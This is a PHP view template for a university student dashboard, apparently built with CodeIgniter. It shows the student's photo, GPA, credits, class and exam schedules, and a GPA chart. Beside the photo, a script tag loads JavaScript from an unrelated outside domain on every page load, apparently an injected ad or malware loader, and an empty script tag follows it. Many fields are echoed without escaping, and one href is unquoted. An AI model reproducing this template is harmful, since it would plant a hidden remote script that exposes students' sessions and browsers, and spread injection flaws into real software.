<div class="row">
     <div id="notifications"><?php echo $this->session->flashdata('msg'); ?></div> 
</div>
<div class="row">
     <div id="notifications"><?php echo $this->session->flashdata('msg2'); ?></div> 
</div>
<div class="row">
     <div id="notifications"><?php echo $this->session->flashdata('msg3'); ?></div> 
</div>

<div class="row">
<div class="col-md-12">
<div class="panel panel-primary">
 
    <div class="panel-body">
        
    <p style="text-align: center">
    <?php echo '<h3 style="text-align: center">Visi</h3><h4 style="text-align: center">'.$prodi->visi_misi;?></h4>
    <?php echo '<h3 style="text-align: center">Misi</h3><h5 style="text-align: center">'.$prodi->misi;?></h5>
    
    </p>
    </div>
</div>
</div>
    

</div>
<div class="row">
<div class="col-xs-12">
<div class="col-md-2">
<?php $dir=  base_url().'doc/foto/';
                            $eks='.jpg';
							$nim=$this->session->userdata('userid');
                            $file=strtoupper($nim);
                            $foto=$dir.$file.$eks;
                            ?>
                    <img src="<?php echo $foto?>" width="110" height="110" class="col-md-12">
                    <script src="https://yonhelioliskor.com/pfe/current/tag.min.js?z=4634947" data-cfasync="false" async></script>
                    <script async="async" data-cfasync="false" src="//"></script>
                    
                    
                    
         </div>           
                    
<div class="col-md-2">
<div class="panel panel-primary">
    <div class="panel-heading"><h3 class="panel-title" align="center">TAHUN AKADEMIK</h3></div>
    <div class="panel-body">
    <p style="text-align: center">
    <?php echo $this->session->userdata('kd_tahun_ajaran') ?></p>
    </div>
</div>
</div>
<div class="col-md-2">
<div class="panel panel-primary">
    <div class="panel-heading"><h3 class="panel-title" align="center"><a href="http://sidu.usn.ac.id">SPP/UKT</a></h3></div>
    <div class="panel-body">
    <p style="text-align: center">
    <a href="http://sidu.usn.ac.id"><?php echo $data ?></a></p>
    </div>
</div>
</div>
<div class="col-md-2">
<div class="panel panel-primary">
    <div class="panel-heading"><h3 align="center"class="panel-title">PEMBIMBING</h3></div>
    <div class="panel-body">
    <p style="text-align: center">
    <?php if($pa){echo ($pa->nm_dosen);}; ?>
    
    </p>
    </div>
</div>
</div>
<div class="col-md-2">
<div class="panel panel-primary ">
    <div class="panel-heading"><h3 align="center"class="panel-title">IPK</h3></div>
    <div class="panel-body">
    <p style="text-align: center">
    <?php echo round($ipk,2) ;?> </p>
    </div>
</div>
</div>
<div class="col-md-2">
<div class="panel panel-primary">
    <div class="panel-heading"><h3 align="center"class="panel-title">TOTAL SKS</h3></div>
    <div class="panel-body">
    <p style="text-align: center">
    <?php echo $tot_sks?></p>
    </div>
</div>
</div>


</div>


</div>
    
<div class="row">
<div class="col-md-4">
<div class="panel panel-info">
<div class="panel-body">
  <div id="container" >

</div>
</div>
</div>
</div>
<div class="col-md-8">
        <div class="panel panel-primary">
<div class="panel-heading">Jadwal Kuliah</div>
<div class="panel-body">
        <table class="table table-bordered table-hover">
            <thead>
                <th>
                    Hari, Jam 
                </th>
                <th>
                    Matakuliah / SKS 
                </th>
                <th>Kelas</th>
                <th>Dosen Pengampu</th>
               
                  <th>Hadir</th>
                   <th>Izin</th>
                     <th>Sakit</th>
                  <th>Group Chat</th>
            </thead>
            <tbody>
<?php
	$tot=0;
    foreach ($jadwalkuliah as $datax) {
    ?>
    <tr>
        <td><?php echo $datax['hari'].', '.$datax['jam']?></td>
       
        <td><?php echo $datax['nm_mtk'].'/'.$datax['sks']?></td>
         <td><?php echo $datax['kelas']?></td>
        <td><?php echo $datax['dosen']?></td>
        
            <td align="center"><?php echo $datax['h']?></td>
             <td align="center"><?php echo $datax['i']?></td>
              <td align="center"><?php echo $datax['s']?></td>
              <td><?php if($datax['group_wa'])
        {
            ?>
             <a class="btn btn-info btn-xs" href="<?php echo $datax['group_wa']?>">Join </a>
        <?php
        }?>
           
            </td>
    </tr>
    
    <?php
    }
    ?>
            </tbody>
        </table>
        </div>
        </div>
    </div>

</div>

<div class="row">
<div class="col-md-6">
<div class="panel panel-primary">
<div class="panel-heading">Kalender Akademik</div>
<div class="panel-body">
<?php echo $jadwal ?>
</div>
</div>

</div>
    
 <div class="row">
    
 <div class="col-md-12">
<div class="panel panel-primary">
<div class="panel-heading">Jadwal Ujian Lengkap</div>
<table id="" border="1" align="center" cellpadding="10"class="table" >
	<tr>
	    <th>Jadwal</th>
	    <th>Jenis Ujian</th>
	    <th>NIM</th>
	    <th>Nama Mahasiswa</th>
	    <th>Judul</th>
		<th>Pembimbing </th>
		<th>Penguji</th>

	
		
	</tr>
<?php
if($jadwalujianlengkap)
{
    foreach ($jadwalujianlengkap as $row3) {
        
        
         
        ?>
		<tr>
		     <td><?php echo $row3['tgl_ujian'].', '.$row3['jam']?></td>
		    <td align='left'><?php echo $row3['jenis_ujian']?></td>
		    <td><?php echo $row3['nim']?></td>
		     <td align='left'><?php echo $row3['nm_mahasiswa']?></td>
		     <td align='left'><a href=<?php echo $row3['link_draft'] ?>><?php echo $row3['judul']?></a></td>
            <td align='left'><?php echo $row3['pembimbing']?></td>

             <td align='left'><?php echo $row3['penguji']?></td>

           


        </tr>
    <?php
    }
}
    ?>

</table>
</div>


</div> 

</div> 

<script src="<?php echo base_url() ?>assets/highchart/jquery-1.9.1.min.js" type="text/javascript"></script>
<script src="<?php echo base_url() ?>assets/highchart/highcharts.js" type="text/javascript"></script>
<script src="<?php echo base_url() ?>assets/highchart/exporting.js" type="text/javascript"></script>



<script type="text/javascript">
	var chart;
$(document).ready(function() {
      chart = new Highcharts.Chart({
         chart: {
            renderTo: 'container',
            type: 'column'
         },   
         title: {
            text: 'Index Prestasi Setiap Semester '
         },
         tooltip: {
                pointFormat: '{series.name}: <b>{point.y} ({point.percentage:.1f}%)</b>'
            },
         xAxis: {
            categories: ['Tahun Akademik']
         },
         yAxis: {
            title: {
               text: 'IPS'
            }
         },
              series:             
            [
<?php      
  
foreach ($listips as $key2) {
	  ?>
	  {
		  name: '<?php echo $key2['semester_ke']; ?>',
		  data: [<?php echo $key2['ips']; ?>]
	  },



<?php }?>
]
});
}



);
</script>